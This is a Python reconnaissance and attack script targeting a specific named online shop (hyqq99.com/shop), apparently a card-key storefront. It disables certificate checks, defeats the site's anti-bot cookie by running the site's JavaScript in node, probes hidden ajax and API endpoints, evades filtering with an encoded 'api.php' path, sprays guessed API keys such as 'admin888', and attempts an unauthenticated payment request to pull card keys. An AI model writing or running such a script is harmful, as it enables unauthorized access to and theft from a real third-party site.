#!/usr/bin/env python3
"""Rainbow SUCCESS_CASES recon for https://hyqq99.com/shop/"""
import re
import json
import ssl
import subprocess
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from pathlib import Path

OUT = Path("/data/recon/hyqq99.com")
(OUT / "probe").mkdir(parents=True, exist_ok=True)
(OUT / "dump").mkdir(parents=True, exist_ok=True)
BASE = "https://hyqq99.com/shop"
HOST = "hyqq99.com"
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def set_cookie(cj, name, value, domain=HOST, path="/"):
    cj.set_cookie(
        http.cookiejar.Cookie(
            0, name, value, None, False, domain, False, False, path, False,
            False, None, False, None, None, {},
        )
    )


def make_session():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=CTX),
    )

    def get(url, data=None, headers=None, timeout=25):
        h = {
            "User-Agent": UA,
            "Accept": "*/*",
            "Referer": BASE + "/",
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
        if headers:
            h.update(headers)
        if data is not None:
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
            h.setdefault("X-Requested-With", "XMLHttpRequest")
        req = urllib.request.Request(url, data=data, headers=h)
        try:
            r = op.open(req, timeout=timeout)
            return r.geturl(), getattr(r, "status", 200), r.read()
        except urllib.error.HTTPError as e:
            return url, e.code, e.read()
        except Exception as e:
            return url, None, str(e).encode()

    # warm shop
    _, _, html = get(BASE + "/")
    text = html.decode("utf-8", "ignore")
    if "sec_defend" in text and "mod=buy" not in text:
        m = re.search(
            r"setCookie\(\s*[\"']sec_defend[\"']\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*[\"']sec_defend_time[\"']",
            text,
            re.S,
        )
        if m:
            val = subprocess.run(
                ["node", "-e", f"console.log({m.group(1)})"],
                capture_output=True,
                text=True,
                timeout=15,
            ).stdout.strip()
            set_cookie(cj, "sec_defend", val)
            set_cookie(cj, "sec_defend_time", "2")
            _, _, html = get(BASE + "/index.php")
            text = html.decode("utf-8", "ignore")
    return get, cj, text


def main():
    get, cj, home = make_session()
    results = {
        "target": "https://hyqq99.com/shop/",
        "title": (re.search(r"<title>([^<]+)", home) or [None, None])[1],
        "cases": {},
        "kami_found": False,
    }
    (OUT / "probe" / "home_shop.html").write_text(home, encoding="utf-8")
    print("TITLE", results["title"], "len", len(home))
    print("markers", {
        "mod=buy": "mod=buy" in home,
        "mod=query": "mod=query" in home,
        "ajax.php": "ajax.php" in home,
        "sec_defend": "sec_defend" in home and "mod=buy" not in home,
    })
    results["contacts"] = {
        "tg": sorted(set(re.findall(r"t\.me/[\w]+|@[A-Za-z][\w]{3,}", home)))[:20],
    }
    print("CONTACTS", results["contacts"])

    # getcount
    _, code, body = get(BASE + "/ajax.php?act=getcount")
    text = body.decode("utf-8", "ignore")
    print("GETCOUNT", code, text)
    results["getcount"] = {"code": code, "body": text}
    try:
        results["getcount"]["json"] = json.loads(text)
    except Exception:
        pass

    # ajax query variants
    ajax_hits = []
    for url in [
        BASE + "/ajax.php?act=query&page=1",
        BASE + "/ajax.php?act=query&page=1&limit=50",
        BASE + "/ajax.php?act=query&page=1&status=1",
    ]:
        _, code, body = get(url, headers={"X-Requested-With": "XMLHttpRequest"})
        text = body.decode("utf-8", "ignore")
        print("AJAX", code, url.split("shop")[-1], text[:250])
        ajax_hits.append({"url": url, "code": code, "body": text[:500]})
    # POST hybrid
    for params in [
        {"page": "1"},
        {"page": "1", "limit": "100"},
        {"page": "1", "content": ""},
        {"page": "1", "kw": "1"},
    ]:
        _, code, body = get(
            BASE + "/ajax.php?act=query",
            data=urllib.parse.urlencode(params).encode(),
        )
        text = body.decode("utf-8", "ignore")
        print("AJAXPOST", params, code, text[:200])
        ajax_hits.append({"params": params, "code": code, "body": text[:400]})
    results["cases"]["ajax_query"] = ajax_hits

    # qd93 query page
    qd93 = []
    for data in ["1", "test", "123456", "20240801", "@hysc99", "13800138000"]:
        _, code, body = get(BASE + f"/?mod=query&data={urllib.parse.quote(data)}")
        text = body.decode("utf-8", "ignore")
        (OUT / "probe" / f"qd93_{data.replace('@','')}.html").write_text(text, encoding="utf-8")
        hits = []
        for pat in [
            r"卡密[^<]{0,100}", r"showOrder", r"mod=faka", r"没有查询到",
            r"查询结果", r"订单号[^<]{0,60}", r"out_trade_no",
        ]:
            m = re.search(pat, text, re.I)
            if m:
                hits.append(m.group(0)[:100])
        print("QD93", data, hits[:6], "len", len(text))
        qd93.append({"data": data, "hits": hits, "len": len(text), "code": code})
    results["cases"]["qd93"] = qd93

    # api via %61pi.php (api.php often hangs)
    api = []
    for path in ["%61pi.php", "api.php"]:
        for qs in [
            "act=search&id=1",
            "act=search&id=100",
            "act=search&id=12649",
            "act=tools&key=",
            "act=tools&key=123456&limit=1",
            "act=tools&key=admin&limit=1",
            "act=site",
            "act=goodslist",
            "act=getcount",
            "act=classlist",
        ]:
            _, code, body = get(BASE + f"/{path}?{qs}", timeout=18)
            text = body.decode("utf-8", "ignore")
            row = {"path": path, "qs": qs, "code": code, "body": text[:400]}
            api.append(row)
            interesting = code == 200 and text and "timed out" not in text.lower()
            if interesting or path == "%61pi.php":
                print("API", path, qs, code, text[:220])
    results["cases"]["api"] = api

    # tools key spray short
    tools = []
    keys = [
        "", "1", "123456", "admin", "test", "hysc99", "hyqq99", "ocean",
        "haiyang", "qq99", "admin888", "888888", "faka888", "rainbow",
    ]
    for key in keys:
        _, code, body = get(
            BASE + f"/%61pi.php?act=tools&key={urllib.parse.quote(key)}&limit=1",
            timeout=15,
        )
        text = body.decode("utf-8", "ignore")
        hit = all(x not in text for x in ["空", "错误", "不正确", "关闭", "登录", "timed"])
        tools.append({"key": key, "code": code, "body": text[:220], "interesting": hit})
        if hit or key in ("", "123456", "admin", "hysc99"):
            print("TOOLS", repr(key), code, text[:220], "HIT" if hit else "")
    results["cases"]["tools"] = tools

    # goods / tids from home
    tids = sorted(set(re.findall(r"tid=(\d+)", home)))
    cids = sorted(set(re.findall(r"cid=(\d+)", home)))
    results["tids_sample"] = tids[:80]
    results["cids"] = cids
    print("TIDS", len(tids), tids[:30], "CIDS", cids)

    # try goodslist/classlist ajax
    for act in ["getclass", "getClass", "getgoods", "getGoods", "getcount", "captcha"]:
        _, code, body = get(BASE + f"/ajax.php?act={act}")
        text = body.decode("utf-8", "ignore")
        print("ACT", act, code, text[:250])

    # buy one tid if any
    goods = []
    for tid in (tids[:5] or ["1", "2", "8", "10"]):
        _, code, body = get(BASE + f"/?mod=buy&tid={tid}")
        text = body.decode("utf-8", "ignore")
        price = re.findall(r"([\d]+\.[\d]{2})", text)[:6]
        stock = re.search(r"(库存|剩余)[^0-9]{0,12}(\d+)", text)
        has_hash = "hashsalt" in text
        info = {
            "tid": tid, "code": code, "len": len(text),
            "prices": price, "stock": stock.group(0) if stock else None,
            "hashsalt": has_hash,
            "title": (re.search(r"<title>([^<]+)", text) or [None, None])[1],
        }
        goods.append(info)
        print("GOODS", info)
        if tid == tids[0] if tids else True:
            (OUT / "probe" / f"buy_{tid}.html").write_text(text, encoding="utf-8")
    results["goods"] = goods

    # pay unauth attempt
    if tids:
        tid = tids[0]
        _, _, body = get(BASE + f"/?mod=buy&tid={tid}")
        text = body.decode("utf-8", "ignore")
        hm = re.search(r"var hashsalt=(.+?);", text)
        hashsalt = ""
        if hm:
            hashsalt = subprocess.run(
                ["node", "-e", f"console.log({hm.group(1)})"],
                capture_output=True,
                text=True,
                timeout=10,
            ).stdout.strip()
        payload = {
            "tid": tid,
            "inputvalue": "13800138000",
            "num": "1",
            "hashsalt": hashsalt,
        }
        _, code, body = get(
            BASE + "/ajax.php?act=pay",
            data=urllib.parse.urlencode(payload).encode(),
        )
        text = body.decode("utf-8", "ignore")
        print("PAY", tid, code, text[:300])
        results["pay_unauth"] = {"tid": tid, "code": code, "body": text[:400], "hashsalt": bool(hashsalt)}

    # kami heuristic
    blob = json.dumps(results, ensure_ascii=False)
    if re.search(r"(卡密|kami)[:：\s\"'][^\"']{6,}", blob, re.I):
        results["kami_found"] = True

    (OUT / "dump" / "STATS.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print("KAMI", results["kami_found"])
    print("DONE")


if __name__ == "__main__":
    main()
